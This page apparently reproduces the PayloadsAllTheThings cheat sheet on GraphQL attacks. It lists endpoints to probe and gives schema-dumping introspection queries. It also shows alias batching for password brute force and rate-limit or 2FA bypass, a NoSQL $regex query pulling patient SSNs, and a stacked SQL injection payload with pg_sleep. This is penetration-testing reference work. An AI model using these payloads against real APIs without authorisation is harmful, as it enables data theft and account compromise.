---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# GraphQL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-graphql-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/GraphQL Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [GraphQL Injection](../../topics/graphql-injection/graphql-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-graphql-injection-readme |
| name | GraphQL Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# GraphQL Injection\n\n> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing\
  \ data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field\
  \ on each type\n\n## Summary\n\n- [Tools](#tools)\n- [Enumeration](#enumeration)\n    - [Common GraphQL Endpoints](#common-graphql-endpoints)\n\
  \    - [Identify An Injection Point](#identify-an-injection-point)\n    - [Enumerate Database Schema via Introspection](#enumerate-database-schema-via-introspection)\n\
  \    - [Enumerate Database Schema via Suggestions](#enumerate-database-schema-via-suggestions)\n    - [Enumerate Types Definition](#enumerate-types-definition)\n\
  \    - [Enumerating Paths to a Target Type](#enumerating-paths-to-a-target-type)\n- [Methodology](#methodology)\n    - [Queries](#queries)\n\
  \        - [Basic Query](#basic-query)\n        - [Query with Arguments](#query-with-arguments)\n        - [Nested Queries](#nested-queries)\n\
  \    - [Mutations](#mutations)\n    - [GraphQL Batching Attacks](#graphql-batching-attacks)\n        - [JSON List Based\
  \ Batching](#json-list-based-batching)\n        - [Query Name Based Batching](#query-name-based-batching)\n- [Injections](#injections)\n\
  \    - [NOSQL Injection](#nosql-injection)\n    - [SQL Injection](#sql-injection)\n- [Labs](#labs)\n- [References](#references)\n\
  \n## Tools\n\n- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Scripting engine to interact with\
  \ a graphql endpoint for pentesting purposes\n- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL Security\
  \ Research Material\n- [doyensec/inql](https://github.com/doyensec/inql) - A Burp Extension for GraphQL Security Testing\n\
  - [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - parses GraphQL introspection schema and\
  \ generates possible queries\n- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Lists the different\
  \ ways of reaching a given type in a GraphQL schema\n- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide)\
  \ - An extensive IDE for exploring GraphQL API's\n- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Obtain\
  \ GraphQL API schema despite disabled introspection\n- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL)\
  \ - A GraphQL password brute-force and fuzzing utility\n- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix)\
  \ - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations\n- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop)\
  \ - Security Auditor Utility for GraphQL APIs\n- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - GraphQL Server\
  \ Engine Fingerprinting utility\n- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Represent\
  \ any GraphQL API as an interactive graph\n- [Insomnia](https://insomnia.rest/) - Cross-platform HTTP and GraphQL Client\n\
  \n## Enumeration\n\n### Common GraphQL Endpoints\n\nGraphQL endpoints are often exposed at predictable paths, most commonly:\n\
  \n- `/graphql`\n- `/graphiql` (interactive IDE)\n\nYou should always probe for both API and developer/debug interfaces.\n\
  \n```ps1\n/v1/explorer\n/v1/graphiql\n/graph\n/graphql\n/graphql/console/\n/graphql.php\n/graphiql\n/graphiql.php\n```\n\
  \nFor an extended wordlist, see [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).\n\
  \n### Identify An Injection Point\n\n> A server MUST accept POST requests, and MAY accept other HTTP methods, such as GET.\
  \ - [GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-Request)\n\n- GET endpoint\n\n    ```js\n\
  \    GET /graphql?query={yourQueryHere}\n    GET /graphql?query={__schema{types{name}}}\n    GET /graphiql?query={__schema{types{name}}}\n\
  \    GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D\n    ```\n\n- POST endpoint\n\n   \
  \ ```js\n    POST /graphql/v1 HTTP/1.1\n    Host: example.com\n    Content-Type: application/json\n\n    {\n    \"query\"\
  : \"query { user { id name } }\"\n    }\n    ```\n\nCheck if errors are visible.\n\n```javascript\n?query={__schema}\n?query={}\n\
  ?query={thisdefinitelydoesnotexist}\n```\n\n### Enumerate Database Schema via Introspection\n\nThe GraphQL specification\
  \ includes special fields, such as `__schema` and `__type`, that allow clients to ask the server what types exist, what\
  \ fields they expose, and how everything connects together.\n\nAn introspection query is simply a request that leverages\
  \ these special fields to retrieve that structural information. This is what allows interactive environments like GraphiQL\
  \ or GraphQL Playground to provide auto-completion, inline documentation, and query validation. When a developer types a\
  \ query, the tool is not guessing, it has already asked the server what is valid and what is not.\n\nA minimal example looks\
  \ like this:\n\n```js\n{\n  \"query\": \"{ __schema { types { name } } }\"\n}\n```\n\nURL encoded query to dump the database\
  \ schema.\n\n```js\nfragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}\n\
  ```\n\nURL decoded query to dump the database schema.\n\n```rs\nfragment FullType on __Type {\n  kind\n  name\n  description\n\
  \  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n  \
  \    ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces\
  \ {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n\
  \  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n\
  \    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n\
  \    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n  \
  \        name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n      \
  \        name\n              ofType {\n                kind\n                name\n              }\n            }\n    \
  \      }\n        }\n      }\n    }\n  }\n}\n\nquery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n \
  \   }\n    mutationType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n    \
  \  description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n```\n\nSingle line queries\
  \ to dump the database schema without fragments.\n\n```rs\n__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}\n\
  ```\n\n```rs\n{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description\
  \ locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name\
  \ description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name\
  \ description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description\
  \ type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind\
  \ name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}\n```\n\n### Enumerate Database Schema via Suggestions\n\
  \nWhen you use an unknown keyword, the GraphQL backend will respond with a suggestion related to its schema.\n\n```json\n\
  {\n  \"message\": \"Cannot query field \\\"one\\\" on type \\\"Query\\\". Did you mean \\\"node\\\"?\",\n}\n```\n\nYou can\
  \ also try to bruteforce known keywords, field and type names using wordlists such as [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist)\
  \ when the schema of a GraphQL API is not accessible.\n\n### Enumerate Types Definition\n\nEnumerate the definition of interesting\
  \ types using the following GraphQL query, replacing \"User\" with the chosen type\n\n```javascript\n{__type (name: \"User\"\
  ) {name fields{name type{name kind ofType{name kind}}}}}\n```\n\n### Enumerating Paths to a Target Type\n\nWhen working\
  \ with a GraphQL schema, especially after running an introspection query, it is not always obvious how a specific type can\
  \ be accessed through queries. A given object (like `User`, `Admin`, or `Payment`) may be reachable through multiple entry\
  \ points and nested relationships.\n\n- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Tool\
  \ that lists the different ways of reaching a given type in a GraphQL schema.\n\nThis tool takes the JSON output of an introspection\
  \ query (which describes the full schema) and analyzes how types are connected. It then outputs different query paths that\
  \ can be used to reach a specific target type. In practice, this means identifying all the possible ways a client could\
  \ craft queries that eventually return that object, even if it is deeply nested or indirectly exposed.\n\n```php\ngraphql-path-enum\
  \ -i ./test_data/h1_introspection.json -t Skill\nFound 27 ways to reach the \"Skill\" node from the \"Query\" node:\n- Query\
  \ (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile\
  \ (skills) -> Skill\n- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items)\
  \ -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (checklist_check_response)\
  \ -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items)\
  \ -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (checklist_checks)\
  \ -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile)\
  \ -> PentesterProfile (skills) -> Skill\n- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection\
  \ (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items)\
  \ -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (embedded_submission_form)\
  \ -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) ->\
  \ PentesterProfile (skills) -> Skill\n- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) ->\
  \ AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (external_programs)\
  \ -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile\
  \ (skills) -> Skill\n- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user)\
  \ -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (job_listings) -> JobListing (team) -> Team\
  \ (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query\
  \ (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (pentest) -> Pentest (lead_pentester)\
  \ -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (pentests) -> Pentest (lead_pentester)\
  \ -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (query) -> Query (assignable_teams)\
  \ -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n\
  - Query (query) -> Query (skills) -> Skill\n```\n\n## Methodology\n\nGraphQL supports three main operation types: **queries**,\
  \ **mutations**, and **subscriptions**.\n\n### Queries\n\nGraphQL queries are used to request specific fields from a schema,\
  \ and the structure of your query directly mirrors the JSON response you will receive. At its simplest, querying data means\
  \ selecting a root field (like `user`, `posts`, or `teams`) and then specifying which subfields you want returned. Unlike\
  \ REST, you never get extra data, everything must be explicitly requested.\n\n#### Basic Query\n\nThe simplest query uses\
  \ the shorthand syntax, where the `query` keyword is omitted. You just define the fields you want starting from the root\
  \ object.\n\n```js\n{\n  user {\n    id\n    name\n  }\n}\n```\n\nThis tells the server to return the `id` and `name` fields\
  \ from the user object. The response will follow the exact same structure. If needed, the full syntax can be used with the\
  \ query keyword, but in most cases the shorthand is enough and commonly seen in real-world traffic.\n\n```js\nquery {\n\
  \  user {\n    id\n    name\n  }\n}\n```\n\n![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)\n\
  \n#### Query with Arguments\n\nTo retrieve specific data, arguments can be passed to fields. These behave like function\
  \ parameters and are often used for IDs, filters, or search queries.\n\n```js\n{\n  user(id: \"1\") {\n    name\n    email\n\
  \  }\n}\n```\n\nThis allows precise targeting of objects and is a common entry point for testing access control issues or\
  \ IDOR-style vulnerabilities.\n\n#### Nested Queries\n\nGraphQL allows deep traversal of relationships in a single request.\
  \ Instead of chaining multiple API calls, you can explore linked objects directly.\n\n```js\n{\n  user(id: \"1\") {\n  \
  \  name\n    posts {\n      title\n      comments {\n        content\n      }\n    }\n  }\n}\n```\n\n### Mutations\n\nA\
  \ mutation is an operation used to change data on the server (create, update, or delete something).\nMutations work like\
  \ function, you can use them to interact with the GraphQL endpoint.\n\n```javascript\nmutation{\n  signIn(login:\"Admin\"\
  , password:\"secretp@ssw0rd\"){\n      token\n    }\n}\n\nmutation{\n  addUser(id:\"1\", name:\"Dan Abramov\", email:\"\
  dan@dan.com\") {\n    id\n    name\n    email\n  }\n}\n```\n\n**Warning**: Mutations usually won't work with GET. [graphql/graphql-over-http,\
  \ issue #123](https://github.com/graphql/graphql-over-http/issues/123)\n\n### GraphQL Batching Attacks\n\nCommon scenario:\n\
  \n- Password Brute-force Amplification Scenario\n- Rate Limit bypass\n- 2FA bypassing\n\n#### JSON List Based Batching\n\
  \n> Query batching is a feature of GraphQL that allows multiple queries to be sent to the server in a single HTTP request.\
  \ Instead of sending each query in a separate request, the client can send an array of queries in a single POST request\
  \ to the GraphQL server. This reduces the number of HTTP requests and can improve the performance of the application.\n\n\
  Query batching works by defining an array of operations in the request body. Each operation can have its own query, variables,\
  \ and operation name. The server processes each operation in the array and returns an array of responses, one for each query\
  \ in the batch.\n\n```json\n[\n    {\n        \"query\":\"...\"\n    },{\n        \"query\":\"...\"\n    }\n    ,{\n   \
  \     \"query\":\"...\"\n    }\n    ,{\n        \"query\":\"...\"\n    }\n    ...\n]\n```\n\n#### Query Name Based Batching\n\
  \n```json\n{\n    \"query\": \"query { qname: Query { field1 } qname1: Query { field1 } }\"\n}\n```\n\nSend the same mutation\
  \ several times using aliases\n\n```js\nmutation {\n  login(pass: 1111, username: \"bob\")\n  second: login(pass: 2222,\
  \ username: \"bob\")\n  third: login(pass: 3333, username: \"bob\")\n  fourth: login(pass: 4444, username: \"bob\")\n}\n\
  ```\n\n## Injections\n\n> SQL and NoSQL Injections are still possible since GraphQL is just a layer between the client and\
  \ the database.\n\n### NOSQL Injection\n\nUse `$regex` inside a `search` parameter.\n\n```js\n{\n  doctors(\n    options:\
  \ \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", \n    search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"\
  }, \\\"lastName\\\":\\\"Admin\\\" }\")\n    {\n      firstName lastName id patients{ssn}\n    }\n}\n```\n\n### SQL Injection\n\
  \nSend a single quote `'` inside a GraphQL parameter to trigger the SQL injection\n\n```js\n{ \n    bacon(id: \"1'\") {\
  \ \n        id, \n        type, \n        price\n    }\n}\n```\n\nSimple SQL injection inside a GraphQL field.\n\n```powershell\n\
  query {\n  user(name: \"patt';SELECT 1;SELECT pg_sleep(30);--'\") {\n    id\n    email\n  }\n}\n```\n\n## Labs\n\n- [PortSwigger\
  \ - Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)\n-\
  \ [PortSwigger - Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)\n\
  - [PortSwigger - Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)\n\
  - [PortSwigger - Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)\n\
  - [PortSwigger - Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)\n\
  - [Root Me - GraphQL - Introspection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection)\n- [Root\
  \ Me - GraphQL - Injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Injection)\n- [Root Me - GraphQL -\
  \ Backend injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)\n- [Root Me - GraphQL\
  \ - Mutation](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)\n\n## References\n\n- [Building a free\
  \ open source GraphQL wordlist for penetration testing - Nohé Hinniger-Foray - August 17, 2023](https://web.archive.org/web/20230919211552/https://escape.tech/blog/graphql-security-wordlist/)\n\
  - [Exploiting GraphQL - AssetNote - Shubham Shah - August 29, 2021](https://web.archive.org/web/20210830161635/https://blog.assetnote.io/2021/08/29/exploiting-graphql/)\n\
  - [GraphQL Batching Attack - Wallarm - December 13, 2019](https://web.archive.org/web/20260223043402/https://lab.wallarm.com/graphql-batching-attack/)\n\
  - [GraphQL for Pentesters presentation - Alexandre ZANNI (@noraj) - December 1, 2022](https://web.archive.org/web/20230205233412/https://acceis.github.io/prez-graphql/)\n\
  - [API Hacking GraphQL - @ghostlulz - June 8, 2019](https://web.archive.org/web/20190619040847/https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)\n\
  - [Discovering GraphQL endpoints and SQLi vulnerabilities - Matías Choren - September 23, 2018](https://web.archive.org/web/20180923085151/https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)\n\
  - [GraphQL abuse: Bypass account level permissions through parameter smuggling - Jon Bottarini - March 14, 2018](https://web.archive.org/web/20231027032512/https://labs.detectify.com/2018/03/14/graphql-abuse/)\n\
  - [Graphql Bug to Steal Anyone's Address - Pratik Yadav - September 1, 2019](https://web.archive.org/web/20250514221822/https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)\n\
  - [GraphQL cheatsheet - devhints.io - November 7, 2018](https://web.archive.org/web/20181107093033/https://devhints.io/graphql)\n\
  - [GraphQL Introspection - GraphQL - August 21, 2024](https://web.archive.org/web/20260302160506/https://graphql.org/learn/introspection/)\n\
  - [GraphQL NoSQL Injection Through JSON Types - Pete Corey - June 12, 2017](https://web.archive.org/web/20250514221852/https://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)\n\
  - [HIP19 Writeup - Meet Your Doctor 1,2,3 - Swissky - June 22, 2019](https://web.archive.org/web/20190825033521/https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)\n\
  - [How to set up a GraphQL Server using Node.js, Express & MongoDB - Leonardo Maldonado - November 5, 2018](https://web.archive.org/web/20190718023950/https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)\n\
  - [Introduction to GraphQL - GraphQL - November 1, 2024](https://web.archive.org/web/20160917011216/http://graphql.org:80/learn)\n\
  - [Introspection query leaks sensitive graphql system information - @Zuriel - November 18, 2017](https://web.archive.org/web/20250710175416/https://hackerone.com/reports/291531)\n\
  - [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r - June 8, 2017](https://web.archive.org/web/20170608142208/https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)\n\
  - [Securing Your GraphQL API from Malicious Queries - Max Stoiber - February 21, 2018](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)\n\
  - [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Jobert Abma (jobert) - November 6,\
  \ 2018](https://web.archive.org/web/20181203004543/https://hackerone.com/reports/435066)"
_relative_path: GraphQL Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/GraphQL Injection/README.md
````
